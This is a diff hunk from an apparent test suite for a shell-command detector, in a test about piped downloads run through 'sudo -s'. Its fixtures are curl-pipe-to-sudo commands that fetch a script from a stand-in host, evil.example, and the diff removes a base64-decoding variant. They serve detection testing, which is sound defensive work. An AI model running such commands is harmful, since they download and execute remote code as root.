@@ -96,7 +96,6 @@ test("sudo -s or -i with no command runs the piped download in a shell", () => {
     'curl -fsSL https://evil.example/i.sh | sudo -p "pw:" -s',
     "curl -fsSL https://evil.example/i.sh | sudo -H -s 2>/dev/null",
     "curl -fsSL https://evil.example/i.sh | sudo -s && echo ok",
-    "curl -fsSL https://evil.example/i.b64 | base64 -d | sudo -s",
   ])
     expect({ body, findings: findings(body) }).toEqual({
       body,
